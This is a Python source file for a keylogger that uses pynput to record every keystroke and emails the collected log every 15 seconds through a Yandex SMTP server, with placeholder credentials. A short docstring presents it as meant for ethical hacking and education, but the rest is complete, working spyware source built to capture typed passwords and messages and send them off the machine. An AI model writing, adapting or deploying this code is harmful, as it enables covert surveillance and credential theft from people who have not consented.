"""
This code is a **keylogger** — it records the user's keystrokes and sends them via email. 
If used for malicious hacking activities, it is considered illegal. 
It should only be used for **ethical hacking, testing, and educational purposes**. 
Running such tools without the explicit consent of the user is strictly prohibited 
in many countries and can lead to serious legal consequences.

"""
import pynput.keyboard  # For capturing keyboard inputs
import smtplib  # For sending emails
import threading  # For executing periodic tasks using threads

log = ""  # String to store the logged keystrokes

# Callback function to handle key press events
def callback_function(key):
    global log
    try:
        # If the key is a printable character, append it to the log
        log = log + str(key.char)
    except AttributeError:
        # If the key is a special key (e.g., space, enter), handle separately
        if key == key.space:
            log = log + " "
        elif key == key.enter:
            log = log + "\n"
        else:
            # For other special keys (e.g., shift, ctrl), convert to string
            log = log + str(key)
    except:
        # Catch any unexpected exceptions
        pass

    # Print the current log to the console (for debugging)
    print(log)

# Function to send the log via email
def send_email(email, password, message):
    # Connect to the Yandex SMTP server
    email_server = smtplib.SMTP("smtp.yandex.com", 587)
    email_server.starttls()  # Secure the connection
    email_server.login(email, password)  # Login using email credentials
    email_server.sendmail(email, email, message)  # Send the email to self
    email_server.quit()  # Disconnect from the server

# Set up the keylogger listener with the callback function
keylogger_listener = pynput.keyboard.Listener(on_press=callback_function)

# Function to periodically send the log via email
def thread_function():
    global log
    # Send the current log
    send_email("Your_Mail_Address@yandex.com", "applicationPassword_taken_from_yandex_apps", log.encode("utf-8"))
    log = ""  # Clear the log after sending

    # Set a timer to run this function again after 15 seconds
    timer_object = threading.Timer(15, thread_function)
    timer_object.start()

# Start the keylogger and the periodic email sending
with keylogger_listener:
    thread_function()  # Start the first timer
    keylogger_listener.join()  # Keep the listener running
